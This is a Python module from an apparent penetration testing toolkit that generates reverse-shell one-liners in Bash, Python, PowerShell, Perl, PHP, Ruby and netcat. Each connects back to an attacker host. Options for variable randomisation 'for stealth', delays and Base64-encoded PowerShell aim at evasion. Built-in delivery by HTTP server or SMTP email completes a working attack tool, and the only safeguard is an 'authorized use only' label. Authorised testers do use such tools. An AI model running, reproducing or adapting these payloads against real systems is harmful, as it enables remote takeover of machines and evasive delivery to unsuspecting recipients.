"""
Exploitation Tool Module for Penetration Testing Toolkit

Generates reverse-shell payloads with advanced options:
- Randomized variable names for stealth
- Optional execution delays (sleep)
- Base64 encoding for PowerShell (-EncodedCommand)
Supports delivery via HTTP server, SMTP email, or file output.

**Authorized Use Only:** Intended for educational and authorized security testing.
"""

import random
import string
import base64
import time
import threading
import socket
from http.server import HTTPServer, BaseHTTPRequestHandler
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Use the project's logger (fallback to default if unavailable)
try:
    from logger import logger
except ImportError:
    import logging
    logger = logging.getLogger(__name__)
    logger.addHandler(logging.NullHandler())

def _random_string(length=8):
    """Generate a random string of letters for variable naming."""
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for _ in range(length))

def generate_bash_payload(lhost, lport, delay=0, randomize_vars=False):
    """
    Generate a Bash reverse shell payload.
    """
    logger.info("Generating Bash payload (LHOST=%s, LPORT=%s)", lhost, lport)
    delay_cmd = f"sleep {delay}; " if delay and delay > 0 else ""
    if randomize_vars:
        var_h = _random_string()
        var_p = _random_string()
        payload = f"{delay_cmd}{var_h}={lhost}; {var_p}={lport}; bash -i >& /dev/tcp/${var_h}/${var_p} 0>&1"
    else:
        payload = f"{delay_cmd}bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    return payload

def generate_python_payload(lhost, lport, delay=0, randomize_vars=False):
    """
    Generate a Python reverse shell payload.
    """
    logger.info("Generating Python payload (LHOST=%s, LPORT=%s)", lhost, lport)
    delay_cmd = f"time.sleep({delay}); " if delay and delay > 0 else ""
    if randomize_vars:
        var_sock = _random_string()
        python_code = (
            f"import socket,subprocess,os; "
            f"{var_sock}=socket.socket(socket.AF_INET,socket.SOCK_STREAM); "
            f"{var_sock}.connect((\"{lhost}\",{lport})); "
            f"os.dup2({var_sock}.fileno(),0); os.dup2({var_sock}.fileno(),1); os.dup2({var_sock}.fileno(),2); "
            f"subprocess.call([\"/bin/sh\",\"-i\"]);"
        )
    else:
        python_code = (
            f"import socket,subprocess,os; "
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); "
            f"s.connect((\"{lhost}\",{lport})); "
            f"os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); "
            f"subprocess.call([\"/bin/sh\",\"-i\"]);"
        )
    # Use python3 executable with -c flag
    return f"python3 -c '{delay_cmd}{python_code}'"

def generate_powershell_payload(lhost, lport, delay=0, encode=False):
    """
    Generate a PowerShell reverse shell payload.
    If encode is True, returns a Base64-encoded command for -EncodedCommand.
    """
    logger.info("Generating PowerShell payload (LHOST=%s, LPORT=%s, encode=%s)", lhost, lport, encode)
    ps_code = (
        f"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
        "$stream = $client.GetStream();"
        "[byte[]]$bytes = 0..65535|%{0};"
        "while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){"
        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
        "$sendback = (iex $data 2>&1 | Out-String );"
        "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        "$stream.Write($sendbyte,0,$sendbyte.Length);"
        "$stream.Flush()}"
        "$client.Close()"
    )
    if delay and delay > 0:
        ps_code = f"Start-Sleep -Seconds {delay}; " + ps_code
    if encode:
        # Base64 encode the UTF-16LE PowerShell command
        encoded_bytes = base64.b64encode(ps_code.encode('utf-16le'))
        encoded_str = encoded_bytes.decode('ascii')
        return f"powershell -NoProfile -EncodedCommand {encoded_str}"
    else:
        return f"powershell -NoProfile -Command \"{ps_code}\""

def generate_perl_payload(lhost, lport, delay=0, randomize_vars=False):
    """
    Generate a Perl reverse shell payload.
    """
    logger.info("Generating Perl payload (LHOST=%s, LPORT=%s)", lhost, lport)
    if delay and delay > 0:
        delay_cmd = f"sleep({delay});"
    else:
        delay_cmd = ""
    if randomize_vars:
        var_i = _random_string().lower()
        var_p = _random_string()
        perl_code = (
            f"use Socket;${var_i}='{lhost}';${var_p}={lport};"
            "socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));"
            "if(connect(S,sockaddr_in(${var_p},inet_aton(${var_i})))){"
            "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec('/bin/sh -i');}"
        )
    else:
        perl_code = (
            f"use Socket;$i='{lhost}';$p={lport};"
            "socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));"
            "if(connect(S,sockaddr_in($p,inet_aton($i)))){"
            "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec('/bin/sh -i');}"
        )
    return f"perl -e '{delay_cmd}{perl_code}'"

def generate_php_payload(lhost, lport, delay=0, randomize_vars=False):
    """
    Generate a PHP reverse shell payload.
    """
    logger.info("Generating PHP payload (LHOST=%s, LPORT=%s)", lhost, lport)
    delay_cmd = f"sleep({delay});" if delay and delay > 0 else ""
    if randomize_vars:
        var_sock = _random_string()
        php_code = (
            f"<?php {delay_cmd}${var_sock}=fsockopen('{lhost}',{lport});"
            "exec('/bin/sh -i <&3 >&3 2>&3'); ?>"
        )
    else:
        php_code = (
            f"<?php {delay_cmd}$sock=fsockopen('{lhost}',{lport});"
            "exec('/bin/sh -i <&3 >&3 2>&3'); ?>"
        )
    return php_code

def generate_ruby_payload(lhost, lport, delay=0, randomize_vars=False):
    """
    Generate a Ruby reverse shell payload.
    """
    logger.info("Generating Ruby payload (LHOST=%s, LPORT=%s)", lhost, lport)
    delay_cmd = f"sleep {delay};" if delay and delay > 0 else ""
    if randomize_vars:
        var_host = _random_string().lower()
        var_port = _random_string()
        ruby_code = (
            f"require 'socket';{var_host}='{lhost}';{var_port}={lport};"
            "exit if fork;tc=TCPSocket.new({var_host},{var_port});"
            "while(cmd=tc.gets){IO.popen(cmd, 'r'){|io|tc.print io.read}}"
        )
    else:
        ruby_code = (
            f"require 'socket';exit if fork;tc=TCPSocket.new('{lhost}',{lport});"
            "while(cmd=tc.gets){IO.popen(cmd, 'r'){|io|tc.print io.read}}"
        )
    return f"ruby -e \"{delay_cmd}{ruby_code}\""

def generate_netcat_payload(lhost, lport, delay=0):
    """
    Generate a Netcat (nc) reverse shell payload.
    Uses a FIFO to chain /bin/sh to netcat for compatibility.
    """
    logger.info("Generating Netcat payload (LHOST=%s, LPORT=%s)", lhost, lport)
    delay_cmd = f"sleep {delay};" if delay and delay > 0 else ""
    payload = (
        f"{delay_cmd}rm /tmp/f; mkfifo /tmp/f; "
        f"/bin/sh </tmp/f 2>&1 | nc {lhost} {lport} >/tmp/f"
    )
    return payload

def generate_all_payloads(lhost, lport, delay=0, randomize_vars=False, encode_ps=False):
    """
    Generate payloads for multiple shell/OS combos in one call.
    Returns a dict with keys: bash, python, powershell, perl, php, ruby, netcat.
    """
    logger.info("Generating all payloads")
    return {
        'bash':       generate_bash_payload(lhost, lport, delay, randomize_vars),
        'python':     generate_python_payload(lhost, lport, delay, randomize_vars),
        'powershell': generate_powershell_payload(lhost, lport, delay, encode=encode_ps),
        'perl':       generate_perl_payload(lhost, lport, delay, randomize_vars),
        'php':        generate_php_payload(lhost, lport, delay, randomize_vars),
        'ruby':       generate_ruby_payload(lhost, lport, delay, randomize_vars),
        'netcat':     generate_netcat_payload(lhost, lport, delay)
    }

class _PayloadRequestHandler(BaseHTTPRequestHandler):
    """HTTP handler to serve the payload string."""
    def __init__(self, payload_str, *args, **kwargs):
        self.payload_str = payload_str
        super().__init__(*args, **kwargs)

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(self.payload_str.encode())

def serve_payload_http(payload_str, host='0.0.0.0', port=8000):
    """
    Start an HTTP server in a background thread to serve the payload at "/".
    """
    logger.info("Starting HTTP server on %s:%d", host, port)
    def handler(*args, **kwargs):
        _PayloadRequestHandler(payload_str, *args, **kwargs)
    httpd = HTTPServer((host, port), handler)
    thread = threading.Thread(target=httpd.serve_forever, daemon=True)
    thread.start()
    logger.info("HTTP server running in background (thread started)")
    return httpd

def send_payload_email(payload_str, smtp_server, smtp_port,
                       username, password, from_addr, to_addr, subject="Payload"):
    """
    Send the payload via email (SMTP with STARTTLS).
    """
    logger.info("Preparing email to %s via SMTP %s:%d", to_addr, smtp_server, smtp_port)
    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = subject
    body = MIMEText(payload_str, 'plain')
    msg.attach(body)
    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(username, password)
            server.send_message(msg)
        logger.info("Email sent successfully")
    except Exception as e:
        logger.error("Failed to send email: %s", e)
        raise

def write_payload_to_file(payload_str, filepath):
    """
    Write the payload string to the specified file path.
    """
    logger.info("Writing payload to file: %s", filepath)
    with open(filepath, 'w') as f:
        f.write(payload_str)
    logger.info("Payload written to file")

# Command-line interface (if module is run directly)
if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Generate reverse-shell payloads")
    parser.add_argument('--lhost', required=True, help="Attacker host for reverse shell (LHOST)")
    parser.add_argument('--lport', required=True, type=int, help="Attacker port (LPORT)")
    parser.add_argument('--delay', type=int, default=0, help="Delay before execution (seconds)")
    parser.add_argument('--randomize', action='store_true', help="Randomize variable names")
    parser.add_argument('--powershell-encode', action='store_true', help="Base64-encode PowerShell payload")
    parser.add_argument('--output', choices=['print', 'file', 'http', 'email'],
                        default='print', help="Delivery method for payload")
    parser.add_argument('--filepath', help="File path (required if --output file)")
    parser.add_argument('--smtp-server', help="SMTP server (required if --output email)")
    parser.add_argument('--smtp-port', type=int, default=587, help="SMTP port")
    parser.add_argument('--smtp-user', help="SMTP username (or email)")
    parser.add_argument('--smtp-pass', help="SMTP password")
    parser.add_argument('--to-email', help="Destination email (if using email)")
    parser.add_argument('--subject', default="Reverse Shell Payload", help="Email subject")

    args = parser.parse_args()

    payloads = generate_all_payloads(
        args.lhost, args.lport, delay=args.delay,
        randomize_vars=args.randomize, encode_ps=args.powershell_encode
    )

    # Choose payload to deliver (default: Bash)
    output_payload = payloads['bash']

    if args.output == 'print':
        print(output_payload)
    elif args.output == 'file':
        if not args.filepath:
            parser.error("--filepath is required with --output file")
        write_payload_to_file(output_payload, args.filepath)
    elif args.output == 'http':
        server = serve_payload_http(output_payload, host=args.lhost)
        print(f"Payload served at http://{args.lhost}:8000/")
        input("Press Enter to stop HTTP server...")
        server.shutdown()
    elif args.output == 'email':
        if not all([args.smtp_server, args.smtp_user, args.smtp_pass, args.to_email]):
            parser.error("SMTP server, user, pass, and recipient are required for email delivery")
        send_payload_email(
            output_payload, args.smtp_server, args.smtp_port,
            args.smtp_user, args.smtp_pass, args.smtp_user, args.to_email, args.subject
        )
    else:
        parser.error("Unknown output option")